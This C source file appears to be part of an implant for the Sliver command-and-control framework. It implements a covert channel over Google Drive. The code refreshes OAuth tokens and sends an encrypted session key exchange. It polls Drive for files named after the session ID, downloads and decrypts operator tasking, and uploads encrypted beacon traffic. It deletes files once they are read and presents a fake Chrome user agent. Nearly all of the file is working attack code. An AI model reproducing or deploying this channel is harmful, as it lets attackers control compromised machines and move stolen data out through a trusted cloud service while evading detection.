#include "pch.h"

BOOL RefreshAccessToken
(
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient
)
{
	CHAR szOauthPath[] = "https://oauth2.googleapis.com/token";
	CHAR szBody[0x400];
	PHTTP_CLIENT pHttpClient = NULL;
	PHTTP_RESP pHttpResp = NULL;
	BOOL Result = FALSE;
	LPSTR lpAccessToken = NULL;
	LPSTR lpContentTypeStr = NULL;
	PDRIVE_PROFILE pProfile = NULL;

	pProfile = pDriveClient->pProfile;
	SecureZeroMemory(szBody, sizeof(szBody));
	pHttpClient = HttpClientInit(UriInit(szOauthPath));
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	wsprintfA(szBody, "client_id=%s&client_secret=%s&refresh_token=%s&grant_type=refresh_token", pProfile->lpClientID, pProfile->lpClientSecret, pProfile->lpRefreshToken);
	lpContentTypeStr = GetContentTypeString(ApplicationXWwwFormUrlencoded);
	pHttpResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "POST", lpContentTypeStr, szBody, lstrlenA(szBody), FALSE, TRUE);
	if (pHttpResp == NULL) {
		goto CLEANUP;
	}

	lpAccessToken = SearchMatchStrA(pHttpResp->pRespData, "access_token\": \"", "\",\n");
	if (lpAccessToken == NULL) {
		goto CLEANUP;
	}

	FREE(pDriveClient->pHttpConfig->lpAccessToken);
	pDriveClient->pHttpConfig->lpAccessToken = lpAccessToken;
	Result = TRUE;
CLEANUP:
	FreeHttpResp(pHttpResp);
	FreeHttpClient(pHttpClient);
	FREE(lpContentTypeStr);

	return Result;
}

PSLIVER_DRIVE_CLIENT DriveInit
(
	_In_ PDRIVE_PROFILE pProfile
)
{
	PSLIVER_DRIVE_CLIENT lpResult = NULL;
	PHTTP_REQUEST pHttpReq = NULL;

	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";
	lpResult = ALLOC(sizeof(SLIVER_DRIVE_CLIENT));
	lpResult->pProfile = pProfile;
	lpResult->pHttpConfig = ALLOC(sizeof(HTTP_CONFIG));
	lpResult->pHttpConfig->lpUserAgent = DuplicateStrA(szUserAgent, 0);
	lpResult->pHttpConfig->dwNumberOfAttemps = 10;

	return lpResult;
}

BOOL DriveStart
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient
)
{
	BOOL Result = FALSE;
	PBUFFER pSessionId = NULL;
	PBYTE pEncryptedSessionInit = NULL;
	DWORD cbEncryptedSessionInit = 0;
	PPBElement pMarshaledData = NULL;
	DWORD i = 0;
	CHAR szName[0x200];
	CHAR szMetadata[0x400];
	LPSTR lpBody = NULL;
	DWORD cbBody = 0;
	LPSTR lpUniqueBoundary = NULL;
	CHAR szContentType[0x80] = "multipart/form-data; boundary=";
	CHAR szUrl[] = "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart";
	PURI pUri = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	PHTTP_RESP pResp = NULL;
	PBUFFER pRespData = NULL;
	CHAR szRespFileName[0x100];
	PBYTE pPublicKeyDigest = NULL;
	LPSTR lpPublicKeyHexDigest = NULL;
	DWORD dwNumberOfTries = 0;
	PDRIVE_PROFILE pProfile = NULL;
	LPSTR lpFileId = NULL;

	pMarshaledData = CreateBytesElement(pConfig->pSessionKey, CHACHA20_KEY_SIZE, 1);
	pEncryptedSessionInit = AgeKeyExToServer(pConfig->lpRecipientPubKey, pConfig->lpPeerPrivKey, pConfig->lpPeerPubKey, pMarshaledData->pMarshaledData, pMarshaledData->cbMarshaledData, &cbEncryptedSessionInit);
	if (pEncryptedSessionInit == NULL || cbEncryptedSessionInit == 0) {
		goto CLEANUP;
	}

	pPublicKeyDigest = ComputeSHA256(pConfig->lpPeerPubKey, lstrlenA(pConfig->lpPeerPubKey));
	lpPublicKeyHexDigest = ConvertBytesToHexA(pPublicKeyDigest, 8);
	pUri = UriInit(szUrl);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pHttpClient = HttpClientInit(pUri);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	lpUniqueBoundary = GenRandomStrW(16);
	wsprintfA(szContentType, "multipart/form-data; boundary=------WebKitFormBoundary%s", lpUniqueBoundary);
	if (!RefreshAccessToken(pDriveClient)) {
		goto CLEANUP;
	}

	pProfile = pDriveClient->pProfile;
	SecureZeroMemory(szName, sizeof(szName));
	SecureZeroMemory(szMetadata, sizeof(szMetadata));
	lpBody = ALLOC(cbEncryptedSessionInit + 0x400);
	wsprintfA(szName, "Hello.%s", pProfile->lpStartExtension);
	wsprintfA(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", szName);
	cbBody = wsprintfA(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n", lpUniqueBoundary);
	cbBody += wsprintfA(&lpBody[cbBody], "%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", szMetadata, lpUniqueBoundary, szName);
	memcpy(&lpBody[cbBody], pEncryptedSessionInit, cbEncryptedSessionInit);
	cbBody += cbEncryptedSessionInit;
	cbBody += wsprintfA(&lpBody[cbBody], "\r\n--------WebKitFormBoundary%s--\r\n", lpUniqueBoundary);
	pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "POST", szContentType, lpBody, cbBody, TRUE, FALSE);
	if (pResp->dwStatusCode != HTTP_STATUS_OK) {
		goto CLEANUP;
	}

	SecureZeroMemory(szRespFileName, sizeof(szRespFileName));
	wsprintfA(szRespFileName, "%s.%s", lpPublicKeyHexDigest, pProfile->lpStartExtension);
	while (dwNumberOfTries < pConfig->dwMaxFailure) {
		Sleep(pProfile->dwPollInterval * 1000);
		pRespData = DriveDownload(pDriveClient, szRespFileName);
		if (pRespData != NULL) {
			break;
		}

		dwNumberOfTries++;
	}

	if (pRespData == NULL) {
		lpFileId = GetFileId(pDriveClient, &szName, 1);
		if (lpFileId != NULL) {
			DriveDelete(pDriveClient, lpFileId);
		}

		goto CLEANUP;
	}

	pSessionId = SliverDecrypt(pConfig->pSessionKey, pRespData);
	memcpy(pConfig->szSessionID, pSessionId->pBuffer, pSessionId->cbBuffer);
	Result = TRUE;
CLEANUP:
	FREE(lpFileId);
	FreeHttpResp(pResp);
	FreeHttpClient(pHttpClient);
	FREE(lpUniqueBoundary);
	FREE(lpBody);
	FREE(pEncryptedSessionInit);
	FREE(pPublicKeyDigest);
	FREE(lpPublicKeyHexDigest);
	FreeElement(pMarshaledData);
	FreeBuffer(pSessionId);
	FreeBuffer(pRespData);

	return Result;
}

BOOL DriveSend
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
	_In_ PENVELOPE pEnvelope
)
{
	PBUFFER pMarshaledEnvelope = NULL;
	CHAR szName[0x200];
	BOOL Result = FALSE;
	CHAR szMetadata[0x400];
	LPSTR lpBody = NULL;
	DWORD cbBody = 0;
	LPSTR lpUniqueBoundary = NULL;
	BOOL NoHeapMemory = FALSE;
	CHAR szContentType[0x80] = "multipart/form-data; boundary=";
	CHAR szUrl[] = "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart";
	PURI pUri = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	PHTTP_RESP pResp = NULL;
	PBUFFER pCipherText = NULL;
	PDRIVE_PROFILE pProfile = NULL;

	if (pEnvelope != NULL && pEnvelope->pData != NULL) {
		PrintFormatA("Write Envelope:\n");
		if (pEnvelope->pData->cbBuffer > 0x800) {
			HexDump(pEnvelope->pData->pBuffer, 0x800);
		}
		else {
			HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
		}
		
	}
	else {
		PrintFormatA("Write Envelope: []\n");
	}
	
	pMarshaledEnvelope = MarshalEnvelope(pEnvelope);
	pCipherText = SliverEncrypt(pConfig->pSessionKey, pMarshaledEnvelope);
	pUri = UriInit(szUrl);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pHttpClient = HttpClientInit(pUri);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	lpBody = ALLOC(pCipherText->cbBuffer + 0x400);
	if (lpBody == NULL) {
		NoHeapMemory = TRUE;
		lpBody = VirtualAlloc(NULL, pCipherText->cbBuffer + 0x400, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (lpBody == NULL) {
			LOG_ERROR("VirtualAlloc", GetLastError());
			goto CLEANUP;
		}
	}

	lpUniqueBoundary = GenRandomStrA(16);
	wsprintfA(szContentType, "multipart/form-data; boundary=------WebKitFormBoundary%s", lpUniqueBoundary);
	if (!RefreshAccessToken(pDriveClient)) {
		goto CLEANUP;
	}

	pProfile = pDriveClient->pProfile;
	SecureZeroMemory(szName, sizeof(szName));
	SecureZeroMemory(szMetadata, sizeof(szMetadata));
	if (pEnvelope->uType == MsgBeaconRegister) {
		wsprintfA(szName, "%s_%d.%s", pConfig->szSessionID, pDriveClient->dwSendCounter, pProfile->lpRegisterExtension);
	}
	else {
		wsprintfA(szName, "%s_%d.%s", pConfig->szSessionID, pDriveClient->dwSendCounter, pProfile->lpSendExtension);
	}

	wsprintfA(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", szName);
	cbBody = wsprintfA(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n", lpUniqueBoundary);
	cbBody += wsprintfA(&lpBody[cbBody], "%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", szMetadata, lpUniqueBoundary, szName);
	memcpy(&lpBody[cbBody], pCipherText->pBuffer, pCipherText->cbBuffer);
	cbBody += pCipherText->cbBuffer;
	cbBody += wsprintfA(&lpBody[cbBody], "\r\n--------WebKitFormBoundary%s--\r\n", lpUniqueBoundary);
	pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "POST", szContentType, lpBody, cbBody, TRUE, FALSE);
	if (pResp->dwStatusCode != HTTP_STATUS_OK) {
		goto CLEANUP;
	}

	pDriveClient->dwSendCounter++;
	Result = TRUE;
CLEANUP:
	FreeHttpResp(pResp);
	FreeHttpClient(pHttpClient);
	FREE(lpUniqueBoundary);
	if (lpBody != NULL) {
		if (NoHeapMemory) {
			VirtualFree(lpBody, 0, MEM_RELEASE);
		}
		else {
			FREE(lpBody);
		}
	}

	FreeBuffer(pMarshaledEnvelope);
	FreeBuffer(pCipherText);

	return Result;
}

PENVELOPE DriveRecv
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient
)
{
	PENVELOPE pResult = NULL;
	PBUFFER pRespData = NULL;
	PBUFFER pPlainText = NULL;
	LPSTR lpTempUri = NULL;
	CHAR szUri[0x80] = "https://www.googleapis.com/drive/v3/files/";
	PHTTP_RESP pResp = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	PURI pUri = NULL;
	DWORD i = 0;
	LPSTR lpFileId = NULL;
	LPSTR SubStrings[2];
	PDRIVE_PROFILE pProfile = NULL;

	pProfile = pDriveClient->pProfile;
	SubStrings[0] = pConfig->szSessionID;
	SubStrings[1] = pProfile->lpRecvExtension;
	lpFileId = GetFileId(pDriveClient, SubStrings, _countof(SubStrings));
	if (lpFileId == NULL) {
		goto CLEANUP;
	}

	lpTempUri = DuplicateStrA(szUri, 0x40);
	wsprintfA(&lpTempUri[lstrlenA(lpTempUri)], "%s?alt=media", lpFileId);
	pUri = UriInit(lpTempUri);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pHttpClient = HttpClientInit(pUri);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	if (!RefreshAccessToken(pDriveClient)) {
		goto CLEANUP;
	}

	pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "GET", NULL, NULL, 0, TRUE, TRUE);
	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
		goto CLEANUP;
	}

	pRespData = BufferMove(pResp->pRespData, pResp->cbResp);
	pResp->pRespData = NULL;
	pPlainText = SliverDecrypt(pConfig->pSessionKey, pRespData);
	pResult = UnmarshalEnvelope(pPlainText);
#ifdef _DEBUG
	PrintFormatA("----------------------------------------------------\nReceive Envelope:\n");
	if (pResult->pData != NULL && pResult->pData->cbBuffer > 0) {
		if (pResult->pData->cbBuffer > 0x800) {
			HexDump(pResult->pData->pBuffer, 0x800);
		}
		else {
			HexDump(pResult->pData->pBuffer, pResult->pData->cbBuffer);
		}
	}
	else {
		PrintFormatA("[]\n");
	}
#endif

	DriveDelete(pDriveClient, lpFileId);
CLEANUP:
	FreeHttpResp(pResp);
	FreeBuffer(pRespData);
	FreeBuffer(pPlainText);
	FreeHttpClient(pHttpClient);
	FREE(lpTempUri);
	FREE(lpFileId);

	return pResult;
}

BOOL DriveClose
(
	_In_ PSLIVER_BEACON_CLIENT pBeaconClient
)
{
	return TRUE;
}

LPSTR GetFileId
(
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
	_In_ LPSTR* pSubStrings,
	_In_ DWORD cSubStrings
)
{
	DWORD cbResp = 0;
	LPSTR lpResult = NULL;
	PHTTP_RESP pResp = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	PURI pUri = NULL;
	LPSTR lpUri = NULL;
	DWORD i = 0;

	if (!RefreshAccessToken(pDriveClient)) {
		goto CLEANUP;
	}

	lpUri = DuplicateStrA("https://www.googleapis.com/drive/v3/files?q=mimeType%20=%20%27application/octet-stream%27%20and%20", 0);
	for (i = 0; i < cSubStrings; i++) {
		lpUri = StrCatExA(lpUri, "name%20contains%20%27");
		lpUri = StrCatExA(lpUri, pSubStrings[i]);
		lpUri = StrCatExA(lpUri, "%27");
		if (i < cSubStrings - 1) {
			lpUri = StrCatExA(lpUri, "%20and%20");
		}
	}

	lpUri = StrCatExA(lpUri, "&fields=files(id,name)");
	pUri = UriInit(lpUri);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pHttpClient = HttpClientInit(pUri);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "GET", NULL, NULL, 0, TRUE, TRUE);
	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
		goto CLEANUP;
	}

	lpResult = SearchMatchStrA(pResp->pRespData, "\"id\": \"", "\",\n");
CLEANUP:
	FreeHttpResp(pResp);
	FreeHttpClient(pHttpClient);
	FREE(lpUri);

	return lpResult;
}

BOOL DriveDelete
(
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
	_In_ LPSTR lpFileId
)
{
	CHAR szUri[0x80] = "https://www.googleapis.com/drive/v3/files/";
	BOOL Result = FALSE;
	PHTTP_RESP pResp = NULL;
	PHTTP_CLIENT pHttpClient = NULL;
	PURI pUri = NULL;

	if (!RefreshAccessToken(pDriveClient)) {
		goto CLEANUP;
	}

	lstrcatA(szUri, lpFileId);
	pUri = UriInit(szUri);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pHttpClient = HttpClientInit(pUri);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "DELETE", NULL, NULL, 0, TRUE, TRUE);
	if (pResp == NULL || pResp->dwStatusCode != HTTP_STATUS_OK) {
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	FreeHttpResp(pResp);
	FreeHttpClient(pHttpClient);

	return Result;
}

PBUFFER DriveDownload
(
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
	_In_ LPSTR lpFileName
)
{
	LPSTR lpFileId = NULL;
	PDRIVE_PROFILE pProfile = NULL;
	LPSTR lpTempUri = NULL;
	PURI pUri = NULL;
	CHAR szUri[0x80] = "https://www.googleapis.com/drive/v3/files/";
	PHTTP_CLIENT pHttpClient = NULL;
	PHTTP_RESP pResp = NULL;
	PBUFFER pResult = NULL;

	pProfile = pDriveClient->pProfile;
	lpFileId = GetFileId(pDriveClient, &lpFileName, 1);
	if (lpFileId == NULL) {
		goto CLEANUP;
	}

	lpTempUri = DuplicateStrA(szUri, 0x80);
	wsprintfA(&lpTempUri[lstrlenA(lpTempUri)], "%s?alt=media", lpFileId);
	pUri = UriInit(lpTempUri);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pHttpClient = HttpClientInit(pUri);
	if (pHttpClient == NULL) {
		goto CLEANUP;
	}

	if (!RefreshAccessToken(pDriveClient)) {
		goto CLEANUP;
	}

	pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "GET", NULL, NULL, 0, TRUE, TRUE);
	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
		FreeHttpResp(pResp);
		goto CLEANUP;
	}

	pResult = BufferMove(pResp->pRespData, pResp->cbResp);
	pResp->pRespData = NULL;
	DriveDelete(pDriveClient, lpFileId);
CLEANUP:
	FreeHttpResp(pResp);
	FREE(lpFileId);
	FreeHttpClient(pHttpClient);
	FREE(lpTempUri);

	return pResult;
}

BOOL FreeDriveClient
(
	_In_ PSLIVER_DRIVE_CLIENT pDriveClient
)
{
	DWORD i = 0;
	PHTTP_CONFIG pHttpConfig = NULL;

	if (pDriveClient != NULL) {
		pHttpConfig = pDriveClient->pHttpConfig;
		if (pHttpConfig != NULL) {
			FREE(pHttpConfig->lpUserAgent);
			FREE(pHttpConfig->lpAccessToken);

			for (i = 0; i < _countof(pHttpConfig->AdditionalHeaders); i++) {
				FREE(pHttpConfig->AdditionalHeaders[i]);
			}

			FREE(pHttpConfig);
		}

		FREE(pDriveClient);
	}

	return TRUE;
}